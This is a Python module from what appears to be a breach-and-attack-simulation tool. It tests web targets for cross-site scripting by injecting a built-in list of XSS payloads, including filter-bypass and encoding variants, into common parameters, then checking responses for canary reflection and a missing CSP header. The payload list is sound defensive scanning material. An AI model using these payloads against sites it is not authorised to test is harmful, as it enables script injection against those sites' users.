"""
Cross-Site Scripting (XSS) testing module.

Tests for reflected, stored, and DOM-based XSS vulnerabilities.

MITRE ATT&CK: T1189 - Drive-by Compromise
"""

from __future__ import annotations

import re
import uuid
from typing import Any
from urllib.parse import urlencode

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


DEFAULT_XSS_PAYLOADS = [
    # Basic reflection tests
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror="alert(1)">',
    # Event handlers
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    # Filter bypasses
    '<ScRiPt>alert(1)</ScRiPt>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src=x onerror=alert`1`>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    # JavaScript protocol
    'javascript:alert(1)',
    'java\tscript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    # Template injection into JS
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    # Encoding bypasses
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
]

# Canary-based detection - inject unique markers and check reflection
CANARY_PREFIX = "BAS"
CANARY_SUFFIX = "XSS"


class XSSModule(BaseAttackModule):
    """XSS testing module with reflected, stored, and DOM-based detection."""

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="xss",
            description="Cross-Site Scripting testing - reflected, stored, DOM-based",
            category="xss",
            mitre_technique_ids=["T1189", "T1059.007"],
            mitre_technique_names=["Drive-by Compromise", "JavaScript"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT,
            owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-79"],
            tags=["injection", "xss", "client-side"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("xss", limit=200)
            if db_payloads:
                return db_payloads
        return DEFAULT_XSS_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        inject_params = options.get("params", ["q", "search", "name", "input", "value", "redirect", "url"])
        method = options.get("method", "GET")
        path = options.get("path", "/")

        for payload in payloads:
            # Add unique canary to track reflection
            canary = f"{CANARY_PREFIX}{uuid.uuid4().hex[:8]}{CANARY_SUFFIX}"
            tagged_payload = payload.replace("alert(1)", f"alert('{canary}')")

            for param in inject_params:
                req_id = str(uuid.uuid4())[:8]
                if method.upper() == "GET":
                    requests.append(AttackRequest(
                        request_id=f"xss-{req_id}",
                        target=target,
                        method="GET",
                        path=path,
                        params={param: tagged_payload},
                        headers={"X-BAS-Canary": canary},
                    ))
                else:
                    requests.append(AttackRequest(
                        request_id=f"xss-{req_id}",
                        target=target,
                        method="POST",
                        path=path,
                        body=urlencode({param: tagged_payload}),
                        content_type="application/x-www-form-urlencoded",
                        headers={"X-BAS-Canary": canary},
                    ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        canary = request.headers.get("X-BAS-Canary", "")

        # Check if payload is reflected unescaped
        xss_indicators = [
            ("<script", "script tag reflected"),
            ("onerror=", "event handler reflected"),
            ("onload=", "event handler reflected"),
            ("onfocus=", "event handler reflected"),
            ("ontoggle=", "event handler reflected"),
            ("onstart=", "event handler reflected"),
            ("javascript:", "javascript protocol reflected"),
            ("<svg", "SVG tag reflected"),
            ("<img", "IMG tag reflected"),
        ]

        for indicator, description in xss_indicators:
            if indicator in payload.lower() and indicator in body.lower():
                # Verify it's actually reflected (not just existing in the page)
                if canary and canary in body:
                    return ModuleResult(
                        module_name="xss",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"XSS confirmed: {description} with canary '{canary}' found in response",
                        severity="high",
                        mitre_technique_id="T1189",
                        detail={"detection_type": "reflected", "indicator": indicator},
                    )
                elif indicator in body.lower():
                    return ModuleResult(
                        module_name="xss",
                        target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE,
                        payload_used=payload,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"Potential XSS: {description} - payload characters reflected",
                        severity="medium",
                        mitre_technique_id="T1189",
                        detail={"detection_type": "potential_reflected"},
                    )

        # Check for CSP headers
        csp = response.headers.get("content-security-policy", "")
        detail: dict[str, Any] = {}
        if not csp:
            detail["missing_csp"] = True

        return ModuleResult(
            module_name="xss",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail=detail,
        )
